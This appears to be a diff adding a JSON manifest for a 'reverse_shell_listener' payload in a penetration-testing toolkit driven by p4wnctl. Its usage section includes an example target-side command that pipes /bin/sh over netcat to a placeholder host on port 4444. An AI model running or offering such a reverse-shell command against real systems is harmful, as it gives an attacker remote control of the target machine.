@@ -1,0 +1,16 @@
+{
+  "name": "reverse_shell_listener",
+  "group": "network",
+  "summary": "Start a simple reverse-shell listener (tcp/4444) and log connections.",
+  "usage": [
+    "p4wnctl payload run reverse_shell_listener",
+    "nc -e /bin/sh __HOST__ 4444   # from target (example)"
+  ],
+  "requirements": ["net"],
+  "env": {
+    "LISTEN_PORT": "4444",
+    "LISTEN_ADDR": "0.0.0.0"
+  },
+  "script": "payloads/listeners/reverse_shell_listener.py",
+  "harden": true
+}
